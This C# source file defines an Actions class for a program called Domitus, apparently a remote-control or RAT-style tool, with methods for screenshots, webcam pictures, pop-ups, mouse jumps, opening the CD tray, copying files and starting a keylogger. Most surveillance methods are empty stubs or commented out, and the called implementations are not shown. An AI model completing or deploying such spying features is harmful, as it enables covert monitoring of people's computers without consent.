using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using Domitus;
using System.Runtime.InteropServices;

namespace Domitus
{
    public class Actions
    {
        public void Screenshot()
        {
            DomitusJM.Actions.Screenshot.TakeScreenshot();

        }
        public void Popup(string e)
        {
            MessageBox.Show(e);
        }

        public void WebcamPicture()
        {
            //DomitusJM.Actions.WebcamPicture.TakePicture();
        }

        public void RandomMouseJump()
        {
            DomitusJM.Actions.RandomMouseJump.doJump();
        }

        public void SearchDirectory(string e)
        {

        }

        public string GetDirectories()
        {
            return "e";
        }

        public void OpenTray()
        {
            DomitusJM.Actions.OpenTray.Open();
        }

        public void CopyFile()
        {

        }

        public void GetUsername()
        {

        }

        public void KeyLoggerStart()
        {

        }
        public void KeyLoggerStop()
        {

        }
    }
}
